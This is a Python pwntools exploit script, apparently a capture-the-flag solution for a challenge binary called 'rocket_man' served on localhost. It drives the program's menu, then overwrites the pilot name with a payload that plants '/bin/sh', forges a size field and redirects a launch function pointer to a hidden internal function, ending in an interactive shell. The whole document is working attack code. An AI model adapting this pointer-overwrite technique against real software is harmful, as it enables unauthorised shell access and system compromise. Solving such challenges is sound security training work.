#!/usr/bin/env python3

from pwn import *

HOST = "localhost"
PORT = 1337

CHOICE_PROMPT = "➤ "
PILOT_NAME_PROMPT = "Pilot Name: "

ROCKET_SIZE_OFFSET = 60
LAUNCH_FUNCTION_OFFSET = 132

elf = context.binary = ELF("./rocket_man")

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = elf.process()


def order_rocket():
    io.sendlineafter(CHOICE_PROMPT, b"1")


def get_license(name: bytes = b"test"):
    io.sendlineafter(CHOICE_PROMPT, b"2")
    io.sendlineafter(PILOT_NAME_PROMPT, name)


def update_name(name: bytes):
    get_license(name)


def launch_rocket():
    io.sendlineafter(CHOICE_PROMPT, b"3")


get_license()
order_rocket()
update_name(
    fit(
        b"/bin/sh\x00",
        {
            ROCKET_SIZE_OFFSET: 0x51,
            LAUNCH_FUNCTION_OFFSET: elf.sym.for_internal_use_only,
        },
    )
)
launch_rocket()

io.interactive()
